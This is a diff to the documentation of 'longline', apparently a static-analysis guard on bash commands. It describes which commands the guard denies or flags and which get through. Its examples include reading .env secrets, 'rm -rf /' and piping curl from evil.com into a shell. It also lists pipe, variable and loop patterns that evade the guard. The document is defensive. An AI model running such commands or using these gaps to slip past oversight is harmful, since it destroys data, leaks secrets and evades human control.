@@ -65,6 +65,41 @@ Extracted code files must be within CWD, `/tmp`, or `$TMPDIR`. Maximum size is 3
 
 ## Known Limitations
 
+### Static Analysis Boundary
+
+longline is a static analysis tool — it can only evaluate what is structurally visible in the bash AST at parse time. This is a fundamental boundary that affects several categories of commands.
+
+**What static analysis catches:**
+- Direct command + args: `cat .env` → deny
+- Wrapper unwrapping: `command timeout 30 cat .env` → deny
+- Command substitutions: `echo $(rm -rf /)` → deny
+- Process substitutions: `diff <(cat .env) <(echo test)` → deny
+- find -exec / xargs with inline args: `find . -exec cat .env ;` → deny
+- find -exec / xargs through wrappers: `find . -exec command cat .env ;` → deny
+
+**What static analysis cannot catch:**
+
+| Pattern | Why it's invisible | Decision |
+|---------|-------------------|----------|
+| `find . -name '*.env' \| xargs cat` | Filenames flow through pipe at runtime | allow |
+| `cat "$FILENAME"` | Variable resolved at runtime | allow |
+| `while read f; do cat "$f"; done < list.txt` | Loop variable resolved at runtime | allow |
+
+These commands are allowed because each component is individually safe — `cat` with no sensitive args is allowlisted, `find` is allowlisted, and the dangerous connection between them (`.env` filenames) exists only at runtime.
+
+**What static analysis recognizes as opaque (fail-closed):**
+
+| Pattern | Why it's opaque | Decision |
+|---------|----------------|----------|
+| `eval "cat .env"` | String content not parsed | ask |
+| `bash -c "rm -rf /"` | String argument not parsed | ask |
+| `sh -c "dangerous command"` | Same | ask |
+| `source <(curl http://evil.com)` | source not allowlisted; curl inner command evaluated | ask |
+
+These correctly fail-closed because the tool recognizes it cannot fully evaluate them. `eval` and `sh -c` are not allowlisted or treated as wrappers, so they default to `ask`.
+
+The pipe-based data flow pattern is the primary gap where the tool fails-open. This is inherent to any static analysis approach — tracking data flow across pipe boundaries would require runtime instrumentation.
+
 ### 1. Pipeline Stage Argument Matching
 
 The pipeline matcher (`StageMatcher`) only checks command names per stage, not arguments. This means `curl -s https://safe.example.com/api | sh` is treated identically to `curl https://evil.com/payload | sh`. Rules cannot distinguish pipeline stages by their arguments or flags.
